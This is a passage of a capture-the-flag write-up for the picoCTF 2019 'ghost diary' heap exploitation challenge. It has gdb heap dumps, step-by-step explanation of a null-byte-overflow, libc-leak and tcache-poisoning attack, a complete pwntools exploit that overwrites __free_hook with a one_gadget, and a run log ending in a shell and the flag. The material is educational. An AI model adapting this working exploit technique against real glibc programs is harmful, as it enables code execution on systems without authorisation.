0x55a7bc254380: 0x0000000000000130      0x0000000000000120 <- chunk B
0x55a7bc254390: 0x4242424242424242      0x4242424242424242
...
0x55a7bc2544a0: 0x0000000000000250      0x0000000000000100 <- chunk C
0x55a7bc2544b0: 0x4343434343434343      0x4343434343434343
0x55a7bc2544c0: 0x4343434343434343      0x4343434343434343
...
```

#### Step 7: **Empty the 0x128 tcache bin in order to use the unsorted bin**

* We must now empty the 0x128 sized tcache bin, so that any mallocs we make with size 0x128 will come out of the unsorted bin. We need to do this because the tcache bin takes priority over the unsorted bin for allocations.

* We do this simply by allocating 7 chunks of size 0x128, so that the 7 chunks in the tcache bin of size 0x128 are taken out.

#### Step 8: **Allocate chunk A back again to move the libc pointers into chunk B**

* We now add a chunk of size 0x128, which gets serviced by the unsorted bin. This will take a 0x128 size chunk out from the 0x350 sized chunk already in the unsorted bin and return it to us. In this case, this returns the chunk A that we initially allocated back to us.

* The key part is that it moves the libc pointers that were in chunk A's `fd` and `bk` down to chunk B, which we ***still*** have a pointer to. This is shown below:

```c
gef➤  x/150gx 0x55a7bc254250
0x55a7bc254250: 0x0000000000000000      0x0000000000000131 <- allocated 0x128 bytes to get chunk A
0x55a7bc254260: 0x00007f7e28fbefe0      0x00007f7e28fbefe0
...
0x55a7bc254380: 0x0000000000000130      0x0000000000000221 <- New consolidated chunk, where chunk B was (and still is)
0x55a7bc254390: 0x00007f7e28fbeca0      0x00007f7e28fbeca0 <- libc pointers moved down
0x55a7bc2543a0: 0x4242424242424242      0x4242424242424242
...
0x55a7bc254490: 0x4242424242424242      0x4242424242424242
0x55a7bc2544a0: 0x0000000000000250      0x0000000000000100 <- chunk C
0x55a7bc2544b0: 0x4343434343434343      0x4343434343434343
0x55a7bc2544c0: 0x4343434343434343      0x4343434343434343
```

#### Step 9: **Use the existing pointer to chunk B to read the libc address of the main_arena**

* Since we still have a pointer to chunk B, we simply use it to read chunk B's contents. In this case, it gives us our libc pointer leak, which we use to calculate the libc base address.

* With the base address, we also calculate the address of `__free_hook`, which is a function pointer that `free()` uses if it is set by the user. If we overwrite this function pointer with a pointer of our choosing, then the next time `free()` is called, it will also call the function pointed to by `__free_hook`, giving us code execution. Code found [here](https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L3084) and shown below:

```c
void
__libc_free (void *mem)
{
  mstate ar_ptr;
  mchunkptr p;                          /* chunk corresponding to mem */

  void (*hook) (void *, const void *)
    = atomic_forced_read (__free_hook);
  if (__builtin_expect (hook != NULL, 0))
    {
      (*hook)(mem, RETURN_ADDRESS (0)); // Calls the function pointed to be __free_hook
      return;
    }
  ...
```

* We must overwrite something like `__free_hook` or `__malloc_hook` (which is malloc's version of the function pointer) because **Full RELRO** is enabled. If it wasn't, we would just overwrite a GOT table entry (`printf` would work).

* With the base address, we also calculate the address of our `one_gadget`, which is essentially a set of instructions in libc that correspond to `execve("/bin/sh", NULL, NULL)`. The one gadget address is found by running david942j's [one_gadget](https://github.com/david942j/one_gadget) tool on `libc-2.27.so`.

* The calculated addresses are shown when the program is ran:

```c
[*] main arena leak: 0x7f7e28fbeca0
[*] Libc base: 0x7f7e28bd3000
[*] one gadget: 0x7f7e28c22322
[*] free_hook: 0x7f7e28fc08e8
```

#### Step 10: **Tcache Poisoning Attack to get malloc to return an arbitrary pointer to us**

* Next, we do a tcache poisoning attack to get a chunk on top of `__free_hook`. I initially fill up the 0x128 sized tcache bin so that its easier to know which index each malloc will go into.

* Next, we add a chunk of size 0x1d8. This will get serviced by the unsorted bin since there is no tcache bin of that size. This gives us a chunk right on top of chunk B, as that was where the consolidated unsorted bin chunk was prior to this malloc. We now have overlapped chunks on top of chunk B.

* Now that we have two pointers to chunk B, we do a double free, which causes the tcache bin for 0x1d8 chunks (the 0x1d0 sized tcache bin) to have the same chunk twice, visualized below:

```c
tcachebin[0x1d0] <- chunk B <- chunk B
```

* We allocate a chunk of size 0x1d8 again, which gives us back one of the chunks from the 0x1d0 sized tcache bin. The tcache bin now looks like the following:

```c
tcachebin[0x1d0] <- chunk B
```

* We set chunk B's `fd` pointer to the address of `__free_hook`. The tcache bin now looks like this:

```c
tcachebin[0x1d0] <- chunk B <- &__free_hook
```

* We do two more mallocs of size 0x1d8, where the first malloc gives us chunk B from the tcache bin, and the second malloc gives us a chunk right on top of `__free_hook`.

* We then overwrite that chunk on `__free_hook` with the address of our one_gadget:

```c
gef➤  x/10gx 0x7f7e28fc08e8
0x7f7e28fc08e8 <__free_hook>:   0x00007f7e28c22322      0x0000000000000000
...
```

* Finally, we call `free()` one more time, which calls the function pointed to by `__free_hook`, which is our one gadget, thus giving us a shell.

#### Final exploit

```python
#!/usr/bin/env python2

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'new-window']

elf = ELF('./ghostdiary')
p = process('./ghostdiary')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Credits to teamrocketist for the following two functions, they help immensely when trying to
# debug exploits
def get_base_address(proc):
	return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(breakpoints):
    script = ""
    PIE = get_base_address(p)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    gdb.attach(p,gdbscript=script)

# Application logic functions
def add(size):
    p.sendlineafter('> ', '1')

    if size <= 0xf0:
        p.sendlineafter('> ', '1')
    else:
        p.sendlineafter('> ', '2')

    p.sendlineafter(': ', str(size))

def talk(page, content):
    p.sendlineafter('> ', '2')
    p.sendlineafter(': ', str(page))
    p.sendafter(': ', str(content))

def listen(page):
    p.sendlineafter('> ', '3')
    p.sendlineafter(': ', str(page))
    content = p.recvline().split(': ')[1].strip('\n')
    return content

def free(page):
    p.sendlineafter('> ', '4')
    p.sendlineafter(': ', str(page))

if args.GDB:
    debug([0x1024])

# Exploit goes here

# Setup
add(0x128) # A, idx 0
add(0x118) # B, idx 1
add(0x118) # C, idx 2

# Fill up tcache bin 0xf0
# This is done because the NULL byte overflow will set the PREV_INUSE bit of the next chunk to 0
# Meaning that it will change the next chunks size to 0x100, and 0x100 chunks go into the 0xf0 tcache bin
# We prevent it from going into this tcache bin because we want that chunk to consolidate backwards
# This will be evident further below
for i in range(7):
	add(0xf0)
for i in range(7):
	free(i+3)

# Fill up tcache bin 0x128
# We do this because of the same reason above
for i in range(7):
	add(0x128)
for i in range(7):
	free(i+3)

# Make chunk A go into unsorted bin
# This is important because we are consolidating chunk C back with both chunks A and B
# Meaning that chunk A needs to already be free, i.e B's PREV_INUSE bit must be set to 0
# This free will also put a libc pointer into chunk A's forward and back pointers
free(0)

# Null byte overflow onto chunk C. C's size is now 0x100. C's prev_size is also set to 0x250
talk(1, 'B'*0x110 + p64(0x250))

# Before we free chunk C, we must ensure that there is a fake chunk 0x100 bytes after chunk C
# This fake chunk must have its PREV_INUSE bit set to 1, hence we choose size 0x21
# The fake chunk is required because chunk C will go into the unsorted bin, which checks to make sure
# that the next chunk's PREV_INUSE bit is set, else it will suspect a double free has occurred
talk(2, 'C'*0xf8 + p64(0x21) + '\n')

# We free C now. Since the prev_size field for C is set to 0x250, this will cause C to consolidate backwards
# by 0x250 bytes, which gives us a chunk in the unsorted bin that has the size 0x350. Now we can allocate
# any chunks less than that size (given that the corresponding tcache bin is full) and have the unsorted bin
# service our requests. Remember that we still have a pointer to chunk B.
free(2)

# Empty the 0x128 tcache bin
# Indexes taken up: 0, 2, 3, 4, 5, 6, 7
for i in range(7):
	add(0x128)

# Now adding a chunk of size 0x128 gives us a chunk from the unsorted bin since the tcache bin is empty
# In this case, unsorted bin will have a 0x350 sized chunk starting at wherever chunk A is
# We first add a 0x128 sized chunk so that the libc address gets moved down into where chunk B is
# This happens because now the unsorted bin will have a chunk starting at chunk B
add(0x128) # idx 8

# Now since we have a pointer to chunk B, we can simply read the libc address that got moved down into it
libc_leak = u64(listen(1).ljust(8, '\x00'))
libc.address = libc_leak - 0x3ebca0
one_gadget = libc.address + 0x4f322
free_hook = libc.symbols['__free_hook']

log.info('main arena leak: ' + hex(libc_leak))
log.info('Libc base: ' + hex(libc.address))
log.info('one gadget: ' + hex(one_gadget))
log.info('free_hook: ' + hex(free_hook))

# Fill up the 0x128 tcache bin again
# We do this to make subsequent mallocs easier to use (i.e their indexes are easier to visualise)
# Indexes freed: 0, 2, 3, 4, 5, 6, 7
free(0)
for i in range(2, 8):
	free(i)

# Add overlapped chunk with B
# We use size 0x1d8 because we want to do the tcache poisoning attack, thus we create this new 0x1d8 tcache bin
# Otherwise there are some checks to bypass if we do an unsorted bin attack (for example)
# It's just easier to do it with the tcache bins
add(0x1d8) # idx 0, overlapped with the starting chunk B

# At this point, the two overlapped chunks are at indexes 0 and 1
# Double free them and put them into tcache bin 0x1d8
free(0)
free(1)

# Add one of them, change its fd to __free_hook
add(0x1d8) # idx 0
talk(0, p64(free_hook) + '\n')

# Two more chunks and we get a chunk on __free_hook
add(0x1d8) # 1, overlapped chunk with idx 0 again
add(0x1d8) # 2, chunk on __free_hook

# Overwrite __free_hook with one_gadget
talk(2, p64(one_gadget) + '\n')

# Trigger __free_hook which gives us shell
free(1)

p.interactive()
```

Running the exploit now on the shell server gives us the flag:
```sh
Faith@pico-2019-shell1:/problems/ghost-diary_3_79b47a93e884f13bbc2640b2e8606676$ python /tmp/Faith/ghost_diary/exploit.py
[*] '/problems/ghost-diary_3_79b47a93e884f13bbc2640b2e8606676/ghostdiary'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './ghostdiary': pid 811337
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Libc base: 0x7f3d6dba5000
[*] one gadget: 0x7f3d6dbf4322
[*] free_hook: 0x7f3d6df928e8
[*] Switching to interactive mode
$ ls
flag.txt  ghostdiary  ghostdiary.c
$ cat flag.txt
picoCTF{nu11_byt3_Gh05T_6c9ca015}$
```
